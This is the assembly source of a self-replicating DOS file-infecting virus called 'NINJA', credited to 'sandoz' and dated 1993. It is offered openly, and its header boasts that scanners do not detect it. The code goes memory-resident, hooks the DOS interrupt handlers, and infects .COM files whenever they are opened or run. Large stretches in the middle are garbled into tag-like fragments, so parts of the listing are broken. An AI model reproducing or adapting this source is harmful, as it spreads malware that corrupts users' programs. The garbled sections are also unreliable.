

;NINJA virus v1.1 _sandoz_

;I dont believe that NINJA scans, it was developed from Soviet block virus
;code that was aquired late in 1988. For this reason some features are missing
;such as original encryption, which really wont be missed. However some features 
;are rather unique. used were System Violator's Virus Mutator and some luck.
;an oldie but interesting.

cseg		segment

		assume	cs:cseg, ds:cseg, es:cseg, ss:cseg
		org	100h

l_0100:	mov	bx,offset l_0146				;0100.BB 0146
	jmp	bx			;Register jump		;0103 FF E3

;-------victim code----------------------------------------------
;		...
		org	0146h

;=======virus code begin=========================================
;	in resident virus this code begins at 9000h:0A000h
;----------------------------------------------------------------
l_0146:	push	ds			;<- entry="" into="" virus="" ;0146="" 1e="" push="" es="" ;0147="" 06="" push="" ax="" ;0148="" 50="" nop="" push="" ds=""></-><-victim code="" restore="" ;0149="" 1e="" pop="" es="" ;014a="" 07="" mov="" si,bx="" ;offset="" wejscia="" w="" wirusa;014b="" 8b="" f3="" add="" si,02d3h="" ;(419)changed="" code="" saved;014d.81="" c6="" 02d3="" mov="" di,0100h="" ;changed="" code="" address="" ;0151.bf="" 0100="" mov="" cx,5="" ;length="" of="" change="" ;0154="" b9="" 0005="" rep="" movsb="" ;0157="" f3/="" a4="" push="" ds="" ;0159="" 1e="" xor="" ax,ax=""></-victim><- get="" int="" 8="" ;015a="" 31="" c0="" push="" ax="" ;015c="" 50="" pop="" ds="" ;015d="" 1f="" mov="" si,20h="" ;int="" 8h="" ;015e.be="" 0020="" mov="" di,bx="" ;0161="" 8b="" fb="" add="" di,0e6h="" ;(022ch)="old" int="" 8="" ;0163.81="" c7="" 00e6="" mov="" cx,4="" ;0167="" b9="" 0004="" rep="" movsb="" ;016a="" f3/="" a4="" mov="" ax,bx="" ;016c="" 8b="" c3="" add="" ax,57h="" ;(019dh)="continuat." adr.;016e="" 05="" 0057="" call="" s_0193="" ;0171="" e8="" 001f="" pop="" ds="" ;0174="" 1f="" l_0175:="" jmp="" short="" l_0175="" ;int="" 8="" waiting="" loop="" ;0175="" eb="" fe=""></-><----- return="" after="" int="" 8="" service-------------------------------="" l_0177:="" cli=""></-----><- int="" 8="" vector="" restore;0177="" fa="" xor="" ax,ax="" ;0178="" 31="" c0="" mov="" es,ax="" ;017a="" 8e="" c0="" mov="" di,0020h="" ;017c.bf="" 20="" 00="" mov="" si,bx="" ;017f="" 8b="" f3="" add="" si,0e9h="" ;(022ch)="" ;0181.81="" c6="" e6="" 00="" mov="" cx,4="" ;0185="" b9="" 04="" 00="" repz="" movsb="" ;0188="" f3="" a4="" sti="" ;018a="" fb="" nop="" pop="" ax=""></-><- run="" victim="" programm="" ;018b="" 58="" pop="" es="" ;018c="" 07="" pop="" ds="" ;018d="" 1f="" mov="" bx,0100h="" ;execution="" begin="" address;018e.bb="" 00="" 01="" jmp="" bx="" ;0191="" ff="" e3=""></-><----- "get="" int="" 8"="" routine="" -------------------------------------="" s_0193="" proc="" near="" cli="" ;="" disable="" interrupts="" ;0193="" fa="" mov="" ds:[20h],ax="" ;0194="" a3="" 0020="" mov="" ds:[22h],es="" ;0197="" 8c="" 06="" 0022="" sti="" ;="" enable="" interrupts="" ;019b="" fb="" retn="" ;019c="" c3="" s_0193="" endp=""></-----><----- code="" executed="" after="" interrupt="" int="" 8----------------------="" l_019d:="" pushf="" ;019d="" 9c="" push="" ax="" ;019e="" 50="" push="" bx="" ;019f="" 53="" push="" cx="" ;01a0="" 51="" push="" dx="" ;01a1="" 52="" push="" si="" ;01a2="" 56="" push="" di="" ;01a3="" 57="" push="" es="" ;01a4="" 06="" push="" ds="" ;01a5="" 1e="" push="" bp="" ;01a6="" 55="" mov="" bp,sp="" ;01a7="" 8b="" ec="" mov="" ax,bx="" ;base="" to="" virus="" code="" ;01a9="" 8b="" c3="" add="" ax,2fh="" ;(175h)="" ;01ab="" 05="" 002f="" cmp="" ss:[bp+14h],ax="" ;interrupted="" code="" cs="" seg;01ae="" 36="" 39="" 46="" 14="" jnz="" l_0220="" ;-=""> we must wait again	;01B2  75 6C

l_01B4:	add     word ptr ss:[BP+14],3	;chng ret addr to l_0177;01B4  36 83 46 14 03

					;<- restore="" int="" 8="" vector="" push="" ds="" ;02b9="" 1e="" xor="" ax,ax="" ;01ba="" 31="" c0="" push="" ax="" ;01bc="" 50="" pop="" ds="" ;01bd="" 1f="" cli="" ;01be="" fa="" mov="" ax,cs:[bx+00e6h]="" ;(022ch)="" old="" int="" 8="" vect="" ;01bf="" 2e="" 8b="" 87="" e6="" 00="" mov="" ds:[20h],ax="" ;01c4="" a3="" 20="" 00="" mov="" ax,cs:[bx+00e8h]="" ;01c7="" 2e="" 8b="" 87="" e8="" 00="" mov="" ds:[22h],ax="" ;01cc="" a3="" 22="" 00="" pop="" ds="" ;01cf="" 1f="" mov="" ax,9000h="" ;memory="" last="" 64kb="" ;01d0="" b8="" 00="" 90="" mov="" es,ax="" ;01d3="" 8e="" c0="" mov="" si,bx="" ;virus="" code="" begin="" ;01d5="" 8b="" f3="" mov="" di,0a000h="" ;the="" last="" 24kb="" of="" mem="" ;01d7="" bf="" 00="" a0="" mov="" al,es:[di]="" ;01da="" 26="" 8a="" 05="" cmp="" al,1eh="" ;allready="" installed="" ;01dd="" 3c="" 1e="" jz="" l_0220="" ;-=""> yes, end of job	;01DF  74 3F
	MOV     CX,02FBh		;virus code length	;01E1  B9 FB 02
	REPZ	MOVSB			;copy virus code	;01E4  F3 / A4
					;<- make="" link="" to="" dos="" call="" s_0230="" ;first="" dos="" version="" ;01e6="" e8="" 47="" 00="" jz="" l_0220="" ;-=""> O.K.		;01E9  74 35
	CALL    s_027D			;Second DOS version	;01EB  E8 8F 00
	JZ      l_0220			;-> O.K.		;01EE  74 30
	CALL    s_02CA			;third DOS version	;01F0  E8 D7 00
	JZ      l_0220			;-> O.K.		;01F3  74 2B

					;<- unknown="" dos="" version,="" brute="" installation="" mov="" ax,9000h="" ;01f5="" b8="" 00="" 90="" push="" ax="" ;01f8="" 50="" pop="" es="" ;01f9="" 07="" xor="" ax,ax="" ;01fa="" 31="" c0="" push="" ax="" ;01fc="" 50="" pop="" ds="" ;01fd="" 1f="" mov="" ax,ds:[84h]="" ;01fe="" a1="" 84="" 00="" mov="" es:[0a1dfh],ax="" ;(0325)="" ;0201="" 26="" a3="" df="" a1="" mov="" es:[0a2ceh],ax="" ;(0414)="" ;0205="" 26="" a3="" ce="" a2="" mov="" ax,ds:[86h]="" ;0209="" a1="" 86="" 00="" mov="" es:[0a1e1h],ax="" ;(0327)="" ;020c="" 26="" a3="" e1="" a1="" mov="" es:[0a2d0h],ax="" ;(0416)="" ;0210="" 26="" a3="" d0="" a2="" mov="" ax,0a1d1h="" ;(0317)="" new="" int="" 21h="" hndl;0214="" b8="" d1="" a1="" mov="" ds:[84h],ax="" ;int="" 21h="" ;0217="" a3="" 84="" 00="" mov="" ax,9000h="" ;resident="" virus="" segment="" ;021a="" b8="" 00="" 90="" mov="" ds:[86h],ax="" ;021d="" a3="" 86="" 00="" l_0220:="" pop="" bp="" ;0220="" 5d="" pop="" ds="" ;0221="" 1f="" pop="" es="" ;0221="" 07="" pop="" di="" ;0222="" 5f="" pop="" si="" ;0223="" 5e="" pop="" dx="" ;0224="" 5a="" pop="" cx="" ;0226="" 59="" pop="" bx="" ;0227="" 5b="" pop="" ax="" ;0228="" 58="" popf="" ;0229="" 9d="" sti="" ;022a="" fb="" db="" 0eah="" ;022b="" ea="" r_00e6="" db="" 0abh,00h,0c2h,0bh="" ;022c="" ab="" 00="" c2="" 0b="" ;="" jmp="" 0bc2:00ab="" ;-=""> oryginal int 8


;================================================================
;	Make link to DOS - first DOS version
;----------------------------------------------------------------
s_0230:	PUSH    DS						;0230  1E

	PUSH    ES						;0231  06
	XOR     AX,AX			;<- check="" possibility="" ;0232="" 31="" c0="" push="" ax="" ;0234="" 50="" pop="" ds="" ;0235="" 1f="" mov="" ax,ds:[86h]="" ;oryginal="" int="" 21h="" seg="" ;0236="" a1="" 86="" 00="" push="" ax="" ;0239="" 50="" pop="" ds="" ;023a="" 1f="" mov="" bx,0100h="" ;023b="" bb="" 00="" 01="" cmp="" byte="" ptr="" [bx],0e9h="" ;023e="" 80="" 3f="" e9="" jnz="" l_027a="" ;-=""> unknown system	;0241  75 37
	INC     BX						;0243  43
	CMP     BYTE PTR [BX],53h				;0244  80 3F 53
	JNZ     l_027A			;-> unknown system	;0247  75 31
	INC     BX						;0249  43
	CMP     BYTE PTR [BX],22h				;024A  80 3F 22
	JNZ     l_027A			;-> unknown system	;024D  75 2B

					;<- make="" link="" to="" dos="" mov="" ax,9000h="" ;024f="" b8="" 00="" 90="" mov="" es,ax="" ;0252="" 8e="" c0="" mov="" si,1223h="" ;0254="" be="" 23="" 12="" mov="" di,0a2ceh="" ;(0414)="" ;0257="" bf="" ce="" a2="" mov="" cx,4="" ;025a="" b9="" 04="" 00="" repz="" movsb="" ;025d="" f3="" a4="" mov="" si,1223h="" ;025f="" be="" 23="" 12="" mov="" di,0a1dfh="" ;(0325)="" ;0262="" bf="" df="" a1="" mov="" cx,4="" ;0265="" b9="" 04="" 00="" repz="" movsb="" ;0268="" f3="" a4="" mov="" ax,0a1d1h="" ;(0317)="new" int="" 21h="" hndl;026a="" b8="" d1="" a1="" mov="" ds:[1223h],ax="" ;026d="" a3="" 23="" 12="" mov="" ax,9000h="" ;0270="" b8="" 00="" 90="" mov="" ds:[1225h],ax="" ;0273="" a3="" 25="" 12="" xor="" ax,ax="" ;0276="" 31="" c0="" cmp="" al,ah="" ;0278="" 38="" e0="" l_027a:="" pop="" es="" ;027a="" 07="" pop="" ds="" ;027b="" 1f="" retn="" ;027c="" c3="" ;="===============================================================" ;="" make="" link="" to="" dos="" -="" second="" dos="" version="" ;----------------------------------------------------------------="" s_027d:="" push="" ds="" ;027d="" 1e="" push="" es="" ;027e="" 06="" xor="" ax,ax=""></-><- check="" possibility="" ;027f="" 31="" c0="" push="" ax="" ;0281="" 50="" pop="" ds="" ;0282="" 1f="" mov="" ax,ds:[86h]="" ;oryginal="" int="" 21h="" seg="" ;0283="" a1="" 0086="" push="" ax="" ;0286="" 50="" pop="" ds="" ;0287="" 1f="" mov="" bx,0100h="" ;0288="" .bb="" 0100="" cmp="" byte="" ptr="" [bx],0e9h="" ;028b="" 80="" 3f="" e9="" jne="" l_02c7="" ;-=""> unknown system	;028E  75 37
	inc	bx						;0290  43
	cmp	byte ptr [bx],0CAh				;0291  80 3F CA
	jne	l_02C7			;-> unknown system	;0294  75 31
	inc	bx						;0296  43
	cmp	byte ptr [bx],13h				;0297  80 3F 13
	jne	l_02C7			;-> unknown system	;029A  75 2B


					;<- make="" link="" to="" dos="" mov="" ax,9000h="" ;029c="" b8="" 9000="" mov="" es,ax="" ;029f="" 8e="" c0="" mov="" si,011dh="" ;02a1="" .be="" 011d="" mov="" di,0a2ceh="" ;(0414)="" ;02a4="" .bf="" a2ce="" mov="" cx,4="" ;02a7="" b9="" 0004="" rep="" movsb="" ;02aa="" f3/="" a4="" mov="" si,011dh="" ;02ac="" .be="" 011d="" mov="" di,0a1dfh="" ;(0325)="" ;02af="" .bf="" a1df="" mov="" cx,4="" ;02b2="" b9="" 0004="" rep="" movsb="" ;02b5="" f3/="" a4="" mov="" ax,0a1d1h="" ;(0317)="new" int="" 21h="" hndl;02b7="" b8="" a1d1="" mov="" ds:[011dh],ax="" ;02ba="" a3="" 011d="" mov="" ax,9000h="" ;02bd="" b8="" 9000="" mov="" ds:[011fh],ax="" ;02c0="" a3="" 011f="" xor="" ax,ax="" ;02c3="" 31="" c0="" cmp="" al,ah="" ;02c5="" 38="" e0="" l_02c7:="" pop="" es="" ;02c7="" 07="" pop="" ds="" ;02c8="" 1f="" retn="" ;02c9="" c3="" ;="==============================================================" ;="" make="" link="" to="" dos="" -="" third="" dos="" version="" ;---------------------------------------------------------------="" s_02ca:="" push="" ds="" ;02ca="" 1e="" push="" es="" ;02cb="" 06="" xor="" ax,ax=""></-><- check="" possibility="" ;02cc="" 31="" c0="" push="" ax="" ;02ce="" 50="" pop="" ds="" ;02cf="" 1f="" mov="" ax,ds:[86h]="" ;oryginal="" int="" 21h="" seg="" ;02d0="" a1="" 0086="" push="" ax="" ;02d3="" 50="" pop="" ds="" ;02d4="" 1f="" mov="" bx,100h="" ;02d5="" .bb="" 0100="" cmp="" byte="" ptr="" [bx],0e9h="" ;02d8="" 80="" 3f="" e9="" jne="" l_0314="" ;-=""> unknown system	;02DB  75 37
	inc	bx						;02DD  43
	cmp	byte ptr [bx],15h				;02DE  80 3F 15
	jne	l_0314			;-> unknown system	;02E1  75 31
	inc	bx						;02E3  43
	cmp	byte ptr [bx],5					;02E4  80 3F 05
	jne	l_0314			;-> unknown system	;02E7  75 2B


					;<- make="" link="" to="" dos="" mov="" ax,9000h="" ;02e9="" b8="" 9000="" mov="" es,ax="" ;02ec="" 8e="" c0="" mov="" si,0040fh="" ;02ee="" .be="" 040f="" mov="" di,0a2ceh="" ;(0414)="" ;02f1="" .bf="" a2ce="" mov="" cx,4="" ;02f4="" b9="" 0004="" rep="" movsb="" ;02f7="" f3/="" a4="" mov="" si,0040fh="" ;02f9="" .be="" 040f="" mov="" di,0a1dfh="" ;(0325)="" ;02fc="" .bf="" a1df="" mov="" cx,4="" ;02ff="" b9="" 0004="" rep="" movsb="" ;0302="" f3/="" a4="" mov="" ax,0a1d1h="" ;(0317)="new" int="" 21h="" hndl;0304="" b8="" a1d1="" mov="" ds:[040fh],ax="" ;0307="" a3="" 040f="" mov="" ax,9000h="" ;030a="" b8="" 9000="" mov="" ds:[0411h],ax="" ;030d="" a3="" 0411="" xor="" ax,ax="" ;0310="" 31="" c0="" cmp="" al,ah="" ;0312="" 38="" e0="" l_0314:="" pop="" es="" ;0314="" 07="" pop="" ds="" ;0315="" 1f="" retn="" ;0316="" c3="" ;="=========================================================================" ;="" new="" int="" 21h="" handling="" subroutine="" ;--------------------------------------------------------------------------="" t_a1d1:="" cmp="" ah,3dh="" ;open="" file="" ;0317="" 80="" fc="" 3d="" je="" l_0321="" ;-=""> Yes			;031A  74 05
	cmp	ah,4Bh			;load&execute/load ovl ?;031C  80 FC 4B
	jne	l_0324			;-> No			;031F  75 03
l_0321:	call	s_0329			;-> infect file		;0321  E8 0005


l_0324:	db	0EAh			;<- oryginal="" int="" 21h="" ;0324="" ea="" d_a1df="" dw="" 1460h,0273h="" ;old="" int="" 21h="" ;0325="" 60="" 14="" 73="" 02="" ;="" jmp="" far="" ptr="" 0273:1460="" ;="=========================================================================" ;="" infecting="" subroutine="" ;--------------------------------------------------------------------------="" s_0329="" proc="" near="" push="" ax="" ;0329="" 50="" push="" bx="" ;032a="" 53="" push="" cx="" ;032b="" 51="" push="" dx="" ;032c="" 52="" push="" ds="" ;032d="" 1e="" push="" di="" ;032e="" 57="" push="" si="" ;032f="" 56="" push="" es="" ;0330="" 06="" push="" ds="" ;0331="" 1e="" push="" es="" ;0332="" 06="" nop="" xor="" ax,ax=""></-><- get="" int="" 24h="" ;0333="" 31="" c0="" push="" ax="" ;0335="" 50="" pop="" ds="" ;0336="" 1f="" push="" cs="" ;0337="" 0e="" pop="" es="" ;0338="" 07="" mov="" si,90h="" ;int="" 24h="" vector="" ;0339="" .be="" 0090="" mov="" di,0a2e0h="" ;(0426)-old="" vector="" safes;033c="" .bf="" a2e0="" mov="" cx,4="" ;double="" word="" ;033f="" b9="" 0004="" rep="" movsb="" ;0342="" f3/="" a4="" mov="" ax,0a2c9h="" ;(040f)="new" int="" 24h="" ;0344="" b8="" a2c9="" mov="" ds:[90h],ax="" ;0347="" a3="" 0090="" mov="" ds:[92h],cs="" ;034a="" 8c="" 0e="" 0092="" nop="" pop="" es="" ;034e="" 07="" pop="" ds="" ;034f="" 1f="" mov="" di,dx="" ;file="" path="" ;0350="" 8b="" fa="" push="" ds="" ;0352="" 1e="" pop="" es="" ;0353="" 07="" mov="" cx,40h="" ;find="" dot="" ;0354="" b9="" 0040="" mov="" al,2eh="" ;0357="" b0="" 2e="" repne="" scasb="" ;0359="" f2/="" ae="" cmp="" cx,0="" ;035b="" 83="" f9="" 00="" jne="" l_0363="" ;035e="" 75="" 03="" jmp="" l_0406="" ;-=""> no file extension	;0360  E9 00A3

l_0363:	push	cs						;0363  0E

	pop	es						;0364  07
	mov	si,di						;0365  8B F7
	mov	di,0A2DDh		;(0423)='COM'		;0367 .BF A2DD
	mov	cx,3						;036A  B9 0003
	repe	cmpsb						;036D  F3/ A6
	cmp	cx,0						;036F  83 F9 00
	je	l_0377						;0372  74 03
	jmp	l_0406			;-> it isn't *.COM	;0374  E9 008F


					;<- *.com="" file="" infection="" l_0377:="" mov="" ax,4300h="" ;get="" file="" attributes="" ;0377="" b8="" 4300="" call="" s_0412="" ;int="" 21h="" call="" ;037a="" e8="" 0095="" mov="" ds:[0a2e4h],cx="" ;(042a)="" ;037d="" 89="" 0e="" a2e4="" and="" cx,0fffeh="" ;no="" r/o="" ;0381="" 81="" e1="" fffe="" mov="" ax,4301h="" ;set="" file="" attributes="" ;0385="" b8="" 4301="" call="" s_0412="" ;int="" 21h="" call="" ;0388="" e8="" 0087="" mov="" ah,3dh="" ;open="" file="" ;038b="" b4="" 3d="" mov="" al,2="" ;r/w="" access="" ;038d="" b0="" 02="" call="" s_0412="" ;int="" 21h="" call="" ;038f="" e8="" 0080="" jc="" l_0406="" ;-=""> Opening Error	;0392  72 72
	push	cs						;0394  0E
	pop	ds						;0395  1F
	mov	bx,ax			;file handle		;0396  8B D8
	mov	dx,0A2D3h		;(0419)	= file buffer	;0398  BA A2D3
	mov	cx,5			;bytes count		;039B  B9 0005

	mov	ah,3Fh			;read file		;039E  B4 3F
	call	s_0412			;int 21h call		;03A0  E8 006F

	mov	ah,0BBh			;allready infected ?	;03A3  B4 BB
	cmp	ah,ds:[0A2D3h]		;(0419)			;03A5  3A 26 A2D3
	je	l_03E2			;-> yes, close file	;03A9  74 37
	xor	cx,cx						;03AB  31 C9
	xor	dx,dx						;03AD  31 D2
	mov	ah,42h			;Move file ptr		;03AF  B4 42

	mov	al,2			;EOF + offset		;03B1  B0 02
	call	s_0412			;int 21h call		;03B3  E8 005C

	cmp	ax,0FA00h		;file size =<64000 ;03b6="" 3d="" fa00="" ja="" l_03e2="" ;-="">  above, close file	;03B9  77 27
	add	ax,100h			;PSP length		;03BB  05 0100
	mov	ds:[0A2D9h],ax		;(041F)	- vir.begin addr;03BE  A3 A2D9
	mov	ah,40h			;Write file		;03C1  B4 40
	mov	dx,0A000h		;address of buffer	;03C3  BA A000

	mov	cx,2FBh			;bytes count		;03C6  B9 02FB
	call	s_0412			;int 21h call		;03C9  E8 0046

	xor	cx,cx						;03CC  31 C9
	xor	dx,dx						;03CE  31 D2
	mov	ah,42h			;Move file ptr		;03D0  B4 42
	mov	al,0			;BOF + offset		;03D2  B0 00
	call	s_0412			;int 21h call		;03D4  E8 003B


	mov	ah,40h			;Write file		;03D7  B4 40
	mov	dx,0A2D8h		;(041E)=BOF virus code	;03D9  BA A2D8
	mov	cx,5			;code length		;03DC  B9 0005
	call	s_0412			;int 21h call		;03DF  E8 0030

l_03E2:	mov	ah,3Eh			;close file		;03E2  B4 3E
	call	s_0412			;int 21h call		;03E4  E8 002B

	mov	cx,ds:[0A2E4h]		;(042A) - old atribute	;03E7  8B 0E A2E4

	mov	ax,4301h		;set file attributes	;03EB  B8 4301
	call	s_0412			;int 21h call		;03EE  E8 0021
	push	ds						;03F1  1E
	push	es								;03F2  06

	xor	ax,ax			;restore int 24h vector	;03F3  31 C0
	push	ax						;03F5  50
	pop	es						;03F6  07
	push	cs						;03F7  0E

	pop	ds						;03F8  1F
	mov	di,90h			;int 24h vector		;03F9 .BF 0090
	mov	si,0A2E0h		;(0426)	- old int 24h	;03FC .BE A2E0
	mov	cx,4			;double word		;03FF  B9 0004
	rep	movsb						;0402  F3/ A4
	pop	es						;0404  07
	pop	ds						;0405  1F
l_0406:	pop	es			;<- exit="" ;0406="" 07="" pop="" si="" ;0407="" 5e="" pop="" di="" ;0408="" 5f="" pop="" ds="" ;0409="" 1f="" pop="" dx="" ;040a="" 5a="" pop="" cx="" ;040b="" 59="" pop="" bx="" ;040c="" 5b="" pop="" ax="" ;040d="" 58="" retn="" ;040e="" c3="" s_0329="" endp="" ;="===============================================================" ;="" int="" 24h="" handling="" routine="" (only="" infection="" time)="" ;----------------------------------------------------------------="" t_a2c9:="" mov="" al,0="" ;ignore="" critical="" error="" ;040f="" b0="" 00="" iret="" ;0411="" cf="" ;="===============================================================" ;="" hidden="" int="" 21h="" call="" ;----------------------------------------------------------------="" s_0412="" proc="" near="" pushf="" ;0412="" 9c="" db="" 9ah="" ;0413="" 9a="" d_a2ce="" dw="" 1460h,0273h="" ;old="" int="" 21h="" ;0414="" 60="" 14="" 73="" 02="" ;call="" far="" ptr="" 0273:1460="" retn="" ;0418="" c3="" s_0412="" endp=""></-><----- oryginal="" bof="" code="" d_a2d3="" db="" 31h,0dh,0ah,32h,0dh="" ;0419="" 31="" 0d="" 0a="" 32="" 0d=""></-----><----- wirus="" bof="" code="" d_a2d8="" db="" 0bbh="" ;041e="" bb="" d_a2d9="" dw="" 0146h="" ;virus="" begin="" address="" ;041f="" 46="" 01="" dw="" 0e3ffh="" ;0421="" ff="" e3=""></-----><----- work="" bytes="" d_a2dd="" db="" 'com'="" ;file="" extension="" pattern="" ;0423="" 43="" 4f="" 4d="" d_a2e0="" dw="" 0556h,1232h="" ;old="" int="" 24h="" vector="" ;0426="" 56="" 05="" 32="" 12="" d_a2e4="" dw="" 0="" ;file="" attributes="" ;042a="" 00="" 00=""></-----><----- just="" my="" way="" of="" sayin'="" howdy="" db="" '-="NINJA=-"></-----><sandoz 1993="">'                 ;042C 50 43 2D 46 4C 55
							;     20 62 79 20 57 49
							;     5A 41 52 44 20 31
							;     39 39 31
cseg	ends		

	end	l_0100

</sandoz></64000></-></-></-></-></-></-></-></-></-></----->